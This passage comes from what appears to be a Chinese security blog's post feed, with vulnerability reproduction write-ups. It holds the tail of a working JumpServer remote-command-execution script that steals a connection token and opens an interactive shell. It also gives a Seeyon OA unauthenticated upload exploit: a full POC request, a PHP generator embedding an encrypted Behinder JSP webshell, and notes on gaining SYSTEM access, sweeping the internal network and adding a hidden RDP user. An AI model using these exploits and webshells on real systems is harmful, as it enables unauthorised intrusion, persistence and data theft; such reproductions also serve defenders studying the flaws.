class="string">'&#123;"task":"/opt/jumpserver/logs/jumpserver"&#125;'</span></span><br><span class="line">        self.send(req)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">closed</span><span class="params">(self, code, reason=None)</span>:</span></span><br><span class="line">        print(<span class="string">"Closed down:"</span>, code, reason)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">received_message</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        resp = json.loads(str(resp))</span><br><span class="line">        <span class="comment"># print(resp)</span></span><br><span class="line">        data = resp[<span class="string">'message'</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"File"</span> <span class="keyword">in</span> data:</span><br><span class="line">            data = <span class="string">""</span></span><br><span class="line">        print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(websocket, _text)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _text == <span class="string">"exit"</span>:</span><br><span class="line">        print(<span class="string">f'you have enter "exit", goodbye'</span>)</span><br><span class="line">        <span class="keyword">await</span> websocket.close(reason=<span class="string">"user exit"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">await</span> websocket.send(_text)</span><br><span class="line">    recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">    print(re.findall(<span class="string">r'"data":"(.*?)"'</span>, recv_text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main_logic</span><span class="params">(target_url)</span>:</span></span><br><span class="line">    print(<span class="string">"\033[32m[o] 正在连接目标: &#123;&#125;\033[0m"</span>.format(target_url))</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(target_url) <span class="keyword">as</span> websocket:</span><br><span class="line">        recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        resws = json.loads(recv_text)</span><br><span class="line">        id = resws[<span class="string">'id'</span>]</span><br><span class="line">        print(<span class="string">"\033[36m[o] 成功获取 ID: &#123;&#125;\033[0m"</span>.format(id))</span><br><span class="line"></span><br><span class="line">        inittext = json.dumps(&#123;<span class="string">"id"</span>: id, <span class="string">"type"</span>: <span class="string">"TERMINAL_INIT"</span>, <span class="string">"data"</span>: <span class="string">"&#123;\"cols\":164,\"rows\":17&#125;"</span>&#125;)</span><br><span class="line">        <span class="keyword">await</span> send_msg(websocket, inittext)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">            print(re.findall(<span class="string">r'"data":"(.*?)"'</span>, recv_text))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd = str(input(<span class="string">"\033[35mcmd  &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">            cmdtext = json.dumps(&#123;<span class="string">"id"</span>: id, <span class="string">"type"</span>: <span class="string">"TERMINAL_DATA"</span>, <span class="string">"data"</span>: cmd + <span class="string">"\r\n"</span>&#125;)</span><br><span class="line">            <span class="keyword">await</span> send_msg(websocket, cmdtext)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">                recv_text = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">                print(re.findall(<span class="string">r'"data":"(.*?)"'</span>, recv_text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_1</span><span class="params">(target_url)</span>:</span></span><br><span class="line">    vuln_url = target_url + <span class="string">"/api/v1/users/connection-token/?user-only=1"</span></span><br><span class="line">    response = requests.get(url=vuln_url, timeout=<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">401</span> <span class="keyword">or</span> response.status_code == <span class="number">403</span> <span class="keyword">or</span> response.status_code == <span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"\033[32m[o] 目标 &#123;&#125; JumpServer堡垒机为未修复漏洞版本，请通过日志获取关键参数\033[0m"</span>.format(target_url))</span><br><span class="line">        ws_open = str(input(<span class="string">"\033[32m[o] 是否想要提取日志（Y/N） &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">        <span class="keyword">if</span> ws_open == <span class="string">"Y"</span> <span class="keyword">or</span> ws_open == <span class="string">"y"</span>:</span><br><span class="line">            ws = target_url.strip(<span class="string">"http://"</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ws = ws_long(<span class="string">'ws://&#123;&#125;/ws/ops/tasks/log/'</span>.format(ws))</span><br><span class="line">                ws.connect()</span><br><span class="line">                ws.run_forever()</span><br><span class="line">                ws.close()</span><br><span class="line">            <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">                ws.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\033[0m"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POC_2</span><span class="params">(target_url, user, asset, system_user)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> target_url == <span class="string">""</span> <span class="keyword">or</span> asset == <span class="string">""</span> <span class="keyword">or</span> system_user == <span class="string">""</span>:</span><br><span class="line">        print(<span class="string">"\033[31m[x] 请获取 assset 等参数配置\033[0m"</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    data = &#123;<span class="string">"user"</span>: user, <span class="string">"asset"</span>: asset, <span class="string">"system_user"</span>: system_user&#125;</span><br><span class="line">    vuln_url = target_url + <span class="string">"/api/v1/users/connection-token/?user-only=1"</span></span><br><span class="line">    <span class="comment"># vuln_url = target_url + "/api/v1/authentication/connection-token/?user-only=1"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(vuln_url, json=data, timeout=<span class="number">5</span>).json()</span><br><span class="line">        print(<span class="string">"\033[32m[o] 正在请求：&#123;&#125;\033[0m"</span>.format(vuln_url))</span><br><span class="line">        token = response[<span class="string">'token'</span>]</span><br><span class="line">        print(<span class="string">"\033[36m[o] 成功获取Token：&#123;&#125;\033[0m"</span>.format(token))</span><br><span class="line">        ws_url = target_url.strip(<span class="string">"http://"</span>)</span><br><span class="line">        ws_url = <span class="string">"ws://"</span> + ws_url + <span class="string">"/koko/ws/token/?target_id=&#123;&#125;"</span>.format(token)</span><br><span class="line">        asyncio.get_event_loop().run_until_complete(main_logic(ws_url))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">"\033[31m[x] 请检查 assset 等参数配置,&#123;&#125;\033[0m"</span>.format(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    title()</span><br><span class="line">    target_url = str(input(<span class="string">"\033[35mPlease input Attack Url\nUrl   &gt;&gt;&gt; \033[0m"</span>))</span><br><span class="line">    user = <span class="string">"452ce66e-87e9-41c2-bc92-b9c110780055"</span></span><br><span class="line">    asset = <span class="string">"b60c9792-a843-4b1b-935d-57134f3fca83"</span></span><br><span class="line">    system_user = <span class="string">"ae4b8369-5b69-4e42-941e-9f2f16686a05"</span></span><br><span class="line">    POC_1(target_url)</span><br><span class="line">    POC_2(target_url, user, asset, system_user)</span><br></pre></td></tr></table></figure><p>最终通过脚本可执行命令。</p><p><img src="/imgs/image-20210120144527345.png" alt="image-20210120144527345"></p><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/5q4cSlHUQ3NejkRg3vOWUA</a></p><p><a href="https://saucer-man.com/information_security/520.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/520.html</a></p>]]></content>
      
      
      <categories>
          
          <category> JumpServer </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> JumpServer </tag>
            
            <tag> 堡垒机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>致远OA未授权访问导致文件上传漏洞复现分析</title>
      <link href="2021/01/13/%E8%87%B4%E8%BF%9COA%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/01/13/%E8%87%B4%E8%BF%9COA%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VUL = [<span class="string">"CNVD_2021_01627"</span>]</span><br><span class="line">VUL_NAME = [<span class="string">"致远OA未授权文件上传漏洞"</span>]</span><br><span class="line">TYPE = [<span class="string">"File Upload"</span>]</span><br><span class="line">DESCRIPTION = <span class="string">'''致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。'''</span></span><br><span class="line">IMPACT = [<span class="string">"致远OA V8.0；致远OA V7.1、V7.1SP1；致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3；致远OA V6.0、V6.1SP1、V6.1SP2；致远OA V5.x；致远OA G6"</span>]</span><br><span class="line">补丁地址：https://service.seeyon.com/patchtools/tp.html<span class="comment">#/patchList?type=%E5%AE%89%E5%85%A8%E8%A1%A5%E4%B8%81&amp;id=1</span></span><br></pre></td></tr></table></figure><h4 id="二、复现"><a href="#二、复现" class="headerlink" title="二、复现"></a>二、复现</h4><p>POC</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host:127.0.0.1</span></span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line">loginPageURL=; login_locale=zh_CN;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 1152</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%03uQ%C3%8BN%C3%830%10%3C%C3%83W%C2%ACrq%2A%C2%8A%23%10B%C2%88%C2%8A%03%15%C3%A5%C2%88%C2%90Z%C3%84%01q0%C3%89%C2%86%C2%BAJl%C3%8B%C3%AB%C3%90TQ%C3%BF%1D%C2%BB%0E%24%12%C3%85%C2%97%7DxvfV%C3%BB%C3%96%C2%B1R%C3%9B%C2%BA%C2%A9%C3%84jg%C2%90%C3%9D%C3%82%C3%85%14%7E%3AO%C2%A2%0E%1D%C3%A6%C2%90%1C%1B%C3%9A%C2%8B%C3%96X%24%C2%92Z%C2%85%C3%8F%C2%A5%C2%B3R%7D%C2%82%11n%0Dw%C2%90p%C2%9Em%C3%B1C%18C%19%21%C3%AE%C2%B4%C3%8A%C2%92%C3%99%29%C3%84w%C2%B2%11_%C2%82K%C3%8D%C2%9F%C3%BD%C2%88%7B%C2%B5%C3%92%C2%A1%053%C3%A4%C2%97%C2%9E%40%C3%A1%16%C2%8E%C3%80%C3%92%C3%80%7F%C2%96%04%27%C2%8Eo%C3%88%C2%B4%C3%89%C3%A4%C2%97%16z%0B%C2%B4%C3%86%C2%AA%0A%1E%02jP%05j%14%C2%AF%25%C3%A5%7C%7E%C2%BF%5C%5C_%3D%60%C2%AE%0B%2F%5C%C3%B41j%1E%07%C2%A5%7FU%C3%A2X_%C3%84%C3%99X%C2%A4%3D%21%C2%8Fq%C3%9E%C2%94%C2%A5%278%C2%98%C2%9AL%C2%93%C2%97%C3%95%C3%A3%C3%B9%C3%8D%C3%98%C3%B4xo%7E%28%2A%C2%95%C2%8E%C3%89%C3%BF%C3%83%C3%A6%C2%95%26%C3%B4%C3%86%C3%B6%C2%B3%C2%B0%C2%A7O%0A%2C%C2%81%C2%9Cp2%C2%87%C2%B6m%C3%93I%C3%87%C3%B6%C3%BEX%C3%BE%60%5D%C2%88%C3%8E6%C3%88%C3%9E%C2%BF%01%C3%B5%C3%A0%1A%C3%96%C3%A7%01%00%00</span><br><span class="line"></span><br><span class="line">HTTP/1.1 <span class="number">500</span> </span><br><span class="line"><span class="attribute">Pragma</span>: No-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 51</span><br><span class="line"><span class="attribute">Date</span>: Wed, 13 Jan 2021 05:50:51 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&#123;"message":null,"code":"0517051026","details":null&#125;</span><br></pre></td></tr></table></figure><p>生成编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$webshell = urldecode(<span class="string">"%1F%C2%8B%08%00%00%00%00%00%00%0AuTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28%2A%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%C2%9D%C2%9D%C2%87%C3%B6%C2%A8%1F%C2%A6I%C3%99y%C3%B8%09%C3%8B%C3%9C%5DH%03%0F%C3%A3%C3%9A%C2%87%C2%9D%C2%98%C3%9C%C3%80%2C%C2%A9%5Cn%C3%8CJ%C3%8B+sE%C3%A1%C2%B6%25%C2%B5%C2%8CE%C3%8ERe%C3%81%2C.%C3%96%5C%12%402%C3%8F%01%C2%AF%C3%A7k%C2%A2%14%C2%AE6%C2%96%C2%8F%C2%83%C2%97%C3%A2%28.%22%5B%C2%93%7CH%C3%B4%0Ap%C2%B8pC%16m%C2%B4a%25%C2%85%C3%83g%27R%C2%AE%5B%C2%A2%26%C2%80%C3%A8%21%141gk%C3%82%C3%952+%C2%96D%C2%9C%01q%5C%C3%81%1A%C2%9F%2C8K%13%06%C3%B4%3D%5D%C2%A38mx%C3%93%C3%8F-%7E%25%C2%80%C2%A5Z%7C%2A%C2%A3%C2%B8%C2%B6%C2%B1%C3%89e%24%15%C2%BB%C2%B0%C3%BC%07%C3%B0%2F%C3%9FlQ%0F%5DqQY%C2%A6%C2%9A%C2%B8%C3%9C%C3%B0Q%12%C2%95%C3%942%C2%95%C2%9B%C2%B48%C3%BA%C2%B6%19%C2%B0%C2%B6%21%C2%9CA5%C2%99Q%C2%9D%1B%60%C3%8B%C3%822T%0C%C2%A2L%C2%97%C3%A7%C2%AD%C3%9EA%1C%07%14%C2%A3%C2%92%C3%84M%C3%A2%C3%B1%C3%8A%00PZ%C2%A6%C3%B4%C2%96%1F%5C%C2%A1%C2%B1J%1Dc%C3%A3%C3%AF%C2%B92%00%C3%BC%C3%86%C2%B7%C2%AB%00y%C2%A6%C2%8A%C2%A5E%06-%C2%84G4%3E%16%C2%9A%C2%AB%5CZ%C2%B6vk%C2%A2b%C2%9B%C3%A0%C3%9C%3E%C2%B6%C3%98%C2%B2%28%C2%A5%C2%9Bi%C2%89%C3%96%C2%A4%C3%84.%C2%81%C2%AC3%3D%C2%8FN%26%C3%BBLsZ%C3%A7%C3%BDl%1B%C2%B5%C3%9E%2A%C2%A09%C2%A0%C3%B9%C2%BB%C3%A7-RB%40%C3%B0%15%C2%8A%25%C2%863%C3%A1%00%C2%97%C2%AB%C3%84%25%C3%80wn%2C%C2%B2%0F%C3%BB%C2%81%7D%C3%98T%5B%C3%83%C3%86V%C2%A8%C2%9F%C2%B7%07i%60%21i%048%C3%BD%C3%96%C3%94%00%09Wh%C2%AA%C2%86e%C2%94%03%5B%C3%B3%11%C3%94%C2%A4%C3%94%C2%A9%C3%8E%C2%A3%3D%C2%87%C2%AFN%1B%C3%A3%C3%B8%C2%8D%5E%13%C2%88%C3%A1%1C%C3%93%C2%BA%C2%AA%C2%81K%14%2COW%13U%C3%9F+%C3%B9%C2%90%C2%85k%1A%C2%83c%C3%AE%C3%A3%0D%2As%C3%9B%04%C3%BE%C2%91%C3%93%C3%83%3AV%C2%8D%C3%93%C2%85%23%3F%C3%81V%C3%A5%C3%87%1F%C3%BE%C2%8C%C3%AC_%C3%BFL%C3%A4JB%C2%B2%C3%96%C3%88%C2%A7u%C2%BE%40%C3%A5%27%C3%AB7%7C%C3%AD%3Cr%C2%89%C3%8E%C3%93%C3%BA%C3%84P%0C%12P5zm%7Dj%C2%BD%C3%86%C2%AF_k%23O%C3%8FT%0Eb%C2%AB%12%C3%8E.k%C3%93%7C%2CRY%140%C2%AC%267h%0Cs%C3%97%C3%807%C3%BA6%C3%9D%C3%AB%C3%8AB%09%C3%959%C3%8Dkq%C2%B7%C3%8B%C2%9B%C3%BE%C3%A0T%C2%BC%C2%8Ftb%C3%93%5E%C2%95%C2%97%2B%0CL%1D%03%7E%C2%9F%C3%9B%C2%9C%C3%8E%1E%C2%89%C3%BE%C3%B6G%0Ej%C2%9AN%C2%ADK%C2%8E1%C3%B53%C2%A11%C3%90%C3%B8%C3%A1%C3%8A%C2%8D%14%C3%962%C2%84%C2%90%C3%86G%C3%BD%C3%90Kh%2CRP%05MO%C3%AF%C2%B9q%0EE%7D%08imw%C3%93q%C3%93%C2%93%C2%80S%2A%C3%87%C2%9C%C2%B0%C2%AE%C2%A8%C2%B3%C2%BB%C3%B0Z%C2%B4u%5D%15.%C2%BF%7F%7C%C2%9Fr%26%C3%8D%C2%A3%3EA%29%C3%A8O%5E%C2%B4%C3%B9%C2%B7%C3%A1%C3%8C%031%C2%A4%C2%83%0E%C3%AFw%3B%C3%A3%C2%9F%2B%C3%B5%C3%BE%3B%C3%95%C2%AD%C3%99%C2%9Dim%5B%C2%A6w%07%C3%AC%C2%B7%C3%B7%24%3F%C2%9D%28%40%C2%B3%04%1E%C2%BEt%C2%8E%C2%87%C3%85%C3%97%C3%A7%C2%8FK%C3%A2%C3%A3%C2%9E%C3%A97%0C%C2%8Ez%1F%C3%81%C3%BFO%17%C3%A08%C3%B5%C2%A8c%3F%C2%BE%C3%97%7B%C2%90%12%C3%90%3B1i%C3%A6d%080eY%C3%B6%1E%5E%C2%BB%3F%C3%A8r%C2%A4%0B%C3%B2%C2%B5%C2%BE%C2%B3K%C3%AEu%C3%BF%C3%BE%17%1CR%C2%AD%17W%05%00%00"</span>);</span><br><span class="line">$webshell = iconv(<span class="string">"UTF-8"</span>,<span class="string">"ISO-8859-1"</span>,$webshell);</span><br><span class="line">$webshell = gzdecode($webshell);</span><br><span class="line"><span class="keyword">echo</span> $webshell;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 自行更改脚本自定义上传位置,webshell名字,冰蝎密码 */</span></span><br><span class="line">$webshell = str_replace(<span class="string">"../webapps/seeyon/"</span>,<span class="string">"../webapps/seeyon/"</span>,$webshell);</span><br><span class="line">$webshell = str_replace(<span class="string">"PeiQi.jspx"</span>,<span class="string">"test.jspx"</span>,$webshell);</span><br><span class="line">$webshell = str_replace(<span class="string">"e45e329feb5d925b"</span>,<span class="string">"e45e329feb5d925b"</span>,$webshell);</span><br><span class="line">$cont = <span class="string">"PGpzcDpyb290IHhtbG5zOmpzcD0iaHR0cDovL2phdmEuc3VuLmNvbS9KU1AvUGFnZSIgdmVyc2lvbj0iMS4yIj48anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS51dGlsLiosamF2YXguY3J5cHRvLiosamF2YXguY3J5cHRvLnNwZWMuKiIvPjxqc3A6ZGVjbGFyYXRpb24+IGNsYXNzIFUgZXh0ZW5kcyBDbGFzc0xvYWRlcntVKENsYXNzTG9hZGVyIGMpe3N1cGVyKGMpO31wdWJsaWMgQ2xhc3MgZyhieXRlIFtdYil7cmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsMCxiLmxlbmd0aCk7fX08L2pzcDpkZWNsYXJhdGlvbj48anNwOnNjcmlwdGxldD5TdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYygoc2Vzc2lvbi5nZXRWYWx1ZSgidSIpKyIiKS5nZXRCeXRlcygpLCJBRVMiKSk7bmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYy5kb0ZpbmFsKG5ldyBzdW4ubWlzYy5CQVNFNjREZWNvZGVyKCkuZGVjb2RlQnVmZmVyKHJlcXVlc3QuZ2V0UmVhZGVyKCkucmVhZExpbmUoKSkpKS5uZXdJbnN0YW5jZSgpLmVxdWFscyhwYWdlQ29udGV4dCk7PC9qc3A6c2NyaXB0bGV0PjwvanNwOnJvb3Q+"</span>;</span><br><span class="line"><span class="comment">/* /* 也可以修改文本内容，注意是base64 */</span></span><br><span class="line">$cont2 = <span class="string">"**"</span>;</span><br><span class="line">$webshell = str_replace($cont,$cont2,$webshell);</span><br><span class="line"><span class="keyword">echo</span> $webshell;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$webshell = gzencode($webshell);</span><br><span class="line">$webshell = iconv(<span class="string">"ISO-8859-1"</span>,<span class="string">"UTF-8"</span> ,$webshell);</span><br><span class="line">$webshell = urlencode(<span class="string">"$webshell"</span>);</span><br><span class="line"><span class="keyword">echo</span> $webshell;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p><img src="/imgs/image-20210114155417136.png" alt="image-20210114155417136"></p><p>访问：</p><p><img src="/imgs/image-20210115154054327.png" alt="image-20210115154054327"></p><h4 id="三、记录"><a href="#三、记录" class="headerlink" title="三、记录"></a>三、记录</h4><p>冰蝎连接</p><p><img src="/imgs/image-20210118102552786.png" alt="image-20210118102552786"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system权限</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210115155229060.png" alt="image-20210115155229060"></p><p>单网卡，ESC 没内网，估计没啥能玩的了</p><p><img src="/imgs/image-20210115154532843.png" alt="image-20210115154532843"></p><p>找到配置文件，尝试连接没成功，后来发现是因为没解密对，可以参考<a href="https://github.com/jas502n/OA-Seeyou进行解密。" target="_blank" rel="noopener">https://github.com/jas502n/OA-Seeyou进行解密。</a></p><p><img src="/imgs/image-20210118103608860.png" alt="image-20210118103608860"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118104147304.png" alt="image-20210118104147304"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对外开放了端口：1433，3389，9000，80</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 172.31.101.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210118103828931.png" alt="image-20210118103828931"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尝试添加隐藏用户 3389连接，提示内部错误，查了下貌似是远程服务太忙或者用户远程桌面登录后断开没有注销导致</span><br></pre></td></tr></table></figure><p><strong>参考链接：</strong></p><p><a href="http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20ajax.do%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html" target="_blank" rel="noopener">致远OA ajax.do登录绕过任意文件上传CNVD-2021-01627</a></p><p><a href="https://github.com/jas502n/OA-Seeyou" target="_blank" rel="noopener">致远OA数据库配置文件</a></p>]]></content>
      
      
      <categories>
          
          <category> OA </category>
          
          <category> 致远OA </category>
          
          <category> CNVD-2021-01627 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> CNVD_2021_01627 </tag>
            
            <tag> 致远OA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nexus漏洞复现</title>
      <link href="2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/12/15/nexus%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
